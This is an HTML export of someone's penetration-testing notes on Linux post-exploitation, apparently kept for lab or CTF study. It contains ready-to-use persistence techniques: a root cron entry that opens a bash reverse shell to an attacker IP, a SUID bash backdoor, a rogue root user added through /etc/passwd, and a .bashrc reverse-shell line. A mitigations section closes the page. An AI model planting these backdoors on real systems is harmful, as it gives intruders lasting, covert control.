<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Post-Exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Post-Exploit</h1><br/><p>Repeat many of the same steps from <a href="PrivEsc--Linux_29.html">PrivEsc</a> procedure</p><p></p><p><a name="BusyBox"></a><h1>Busybox for Limited Binaries</h1></p><p>If a target doesn&#39;t have standard binaries installed, you can upload a statically compiled <a href="file:///home/asura/static_binaries">busybox</a>.</p><p></p><p>You can download busybox, &amp; view the binaries it comes with, <a href="https://busybox.net/downloads/binaries/">here</a>. You just use<strong> ./busybox</strong> COMMAND. For example,</p><p></p><p><em>./busybox nc 10.6.51.30 8888</em></p><p></p><p><a name="full impersonate"></a><h1>Full Impersonation</h1></p><p>[Memory 21]</p><p>For example, <span style="color:#ff0000;">after</span> exploiting a <span style="color:#ff0000;">SUID </span>binary, <span style="color:#ff0000;">run</span><em><span style="color:#ff0000;"> id</span></em> &amp; you&#39;ll get a root shell but <span style="color:#ff0000;">not full impersonation</span> of the root Acct. Either UID or EUID will be root but other values like GID &amp; Group will be the prev user.</p><p></p><p>This may <span style="color:#ff0000;">restrict you from performing certain actions</span>!</p><p></p><p><h2>Creating New Root User</h2></p><p>You can leverage your root EUID to add a new root user. This way you don&#39;t need to worry about SSH running &amp; having the correct config. <a href="PrivEsc--Linux_29.html#Writable /etc/passwd">Modify /etc/passwd</a> &amp; login with <strong>su -l USER</strong>.</p><p></p><p><h2>Using SSH</h2></p><p>One way fix this is to <a href="Pivoting_22.html#ssh setup">setup SSH</a> for the target Acct &amp; use that to log into that Acct. Special config likely needed for <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#root ssh">root SSH</a>.</p><p></p><p><h1>Persistence</h1></p><p>Ensure that if you get disconnected, you&#39;ll be able to quickly &amp; easily regain privileged access. IRL stealth may be a concern, &amp; should be weighed against the benefits of any given technique.</p><p></p><p><a name="Create a Cron Job"></a><h2>Create a Cron Job</h2></p><p><h3>Writing File</h3></p><p>You can use a Heredoc to write the cron file using a Reverse Shell. Target <strong>/etc/cron.d/</strong> to get a shell that triggers quickly.</p><p></p><p><em>cat &lt;&lt; EOF &gt; /etc/cron.d/evil</em></p><p></p><p><h3>Timing</h3></p><p>In <strong>/etc/cron.d/</strong>, use <strong>* * * * *</strong> to trigger the job EVERY minute. The job would only trigger once on minute 1 if you did <strong>1 * * * *</strong>.</p><p></p><p><h3>Payload</h3></p><p>It&#39;s safer to invoke binaries using their absolute path (verify that the host doesn&#39;t use non-standard file locations).</p><p></p><p>Cron uses<strong> /bin/sh </strong>by default, but if you&#39;re running a bash payload, you can change the value of <strong>SHELL</strong>.</p><p></p><p>Wrap payload in single quotes so special characters (e.g. input redirectors) are properly interpretted. Your final command will probably look like <strong>bash -c ‘PAYLOAD’</strong></p><p></p><p>Specify <strong>root</strong> explicitly to ensure that your command will run as root (necessary for commands run in <strong>/etc/cron.d/</strong>, but not if you use <strong>/var/spool/cron/crontabs/</strong> instead).</p><p></p><p><strong>SHELL=/bin/bash</strong><strong></strong></p><p><strong>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</strong><strong></strong></p><p><strong>* * * * * root bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.6.51.30/9999 0&gt;&amp;1&#39;</strong></p><p></p><p><h2>SUID</h2></p><p><em>chmod u+s /usr/bin/bash</em></p><p></p><p>After obtaining RCE, just <em>/usr/bin/bash -p</em></p><p></p><p><h2>Writing to /etc/passwd</h2></p><p><a href="PrivEsc--Linux_29.html#Writable /etc/passwd">Edit /etc/passwd</a> to either add a new root user (&amp; give them SSH access) or change root&#39;s passwd (disruptive &amp; not stealthy)</p><p></p><p><h2>Setup root SSH</h2></p><p>Likely need to edit SSH Config to allow <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#root ssh">root SSH</a>. You can then generate keys &amp; setup <strong>authorized_keys</strong>.</p><p></p><p><h2>Bash Config Files</h2></p><p><h3>Background</h3></p><p><span class="subheading">~/.bash_profile</span><ul><li>Used for login shells: This file is executed when you log into a system (e.g., via a terminal, SSH, or a GUI login). A login shell is a shell session that is initiated as part of a login process.</li></ul></p><p><ul><li>Common purposes: This file is often used to set environment variables, such as PATH, LANG, or any system-wide initialization settings that should apply to the user&#39;s environment.</li></ul></p><p><ul><li>Common contents: It might contain commands like exporting environment variables or running other startup scripts.</li></ul></p><p></p><p><span class="subheading">~/.bashrc</span><ul><li>Used for non-login interactive shells: This file is executed for interactive non-login shells (e.g., when you open a new terminal window in an existing session, or execute a shell with a command).</li></ul></p><p><ul><li>Common purposes: It&#39;s primarily used to define things like shell options (shopt), aliases, functions, and custom prompts (PS1).</li></ul></p><p><ul><li>Common contents: It often includes interactive settings like alias definitions or custom prompt configurations.</li></ul></p><p></p><p><h3>Attack Vectors (Use Case)</h3></p><p><span class="subheading">Backdoors</span>: Malicious code in these scripts can open ports for remote access or install persistent backdoors that reconnect automatically, even if you think you&#39;ve removed the initial infection.</p><p></p><p><span class="subheading">Keyloggers</span>: They could also install keyloggers to capture sensitive information such as passwords and commands.</p><p></p><p><span class="subheading">Command Hijacking</span>: The attacker might replace commonly used commands (like <strong>ls</strong>, <strong>ps</strong>, <strong>cat</strong>, etc.) with their own versions that log keystrokes or hide malicious activity.</p><p></p><p><h3>Exploitation</h3></p><p>Both of these files are executed automatically when certain types of shell sessions are started, &amp; they can be modified to execute malicious commands whenever any user logs in or opens a new terminal session.</p><p></p><p><span class="subheading">~/.bash_profile</span></p><p><strong>Persistence on login</strong>: The ~/.bash_profile script is executed when you log into your system. An attacker could add commands to this file that run malicious programs every time you log in (such as a backdoor or keylogger).</p><p></p><p>For example, you can add a line that silently runs a malicious script. The following line would run a malicious script every time a user logs in, &amp; it could be hidden in a way that is hard to detect.</p><p></p><p><em>nohup /path/to/malicious/script.sh &amp;&gt;/dev/null &amp;</em></p><p></p><p><span class="subheading">~/.bashrc</span></p><p><strong>Persistence in new terminal sessions</strong>: The <strong>~/.bashrc</strong> script is executed when a new terminal session is started, letting an attacker launche malware whenever the target starts a new terminal.</p><p></p><p>For example, the following line would start a reverse shell when a terminal is opened.</p><p></p><p><em>bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1</em></p><p></p><p><h3>Mitigations</h3></p><p><span class="subheading">Check the contents regularly</span>: Periodically review <strong>~/.bashrc</strong> and <strong>~/.bash_profile</strong> for any suspicious or unfamiliar entries.</p><p></p><p><span class="subheading">Monitor file integrity</span>: Use tools like <strong>AIDE</strong> (Advanced Intrusion Detection Environment) or tripwire to monitor file integrity and alert you if these files are modified unexpectedly.</p><p></p><p><span class="subheading">Restrict file permissions</span>: Ensure that only trusted users have write permissions to these files. For example, set the file permissions to be writable only by the appropriate user:</p><p></p><p><em>chmod 600 ~/.bashrc ~/.bash_profile</em></p><p></p><p><span class="subheading">Use auditd</span>: Set up auditing tools (like auditd on Linux) to log when files such as <strong>~/.bashrc</strong> or <strong>~/.bash_profile</strong> are modified.</p><p></p><p><span class="subheading">Limit sudo and root access</span>: Restrict the ability to edit critical files (like <strong>~/.bashrc</strong>, <strong>~/.bash_profile</strong>) by ensuring that only trusted users have sudo or root access. Use sudo cautiously.</p><p></p><p><span class="subheading">Use secure file editors</span>: When editing these files, use secure editors or tools that track changes to prevent unintended modifications.</p><p></p><p><span class="subheading">Check running processes</span>: Regularly check for any unfamiliar processes or network connections using commands like ps aux or netstat to ensure that nothing malicious is running in the background.</p><p></p><p><span class="subheading">Anti-virus and Anti-malware</span>: Running a system with updated antivirus software or security tools can help detect and mitigate known threats, including scripts or malicious binaries hidden in these files.</p><p></p><p></p><p></p></div>
</body>
</html>
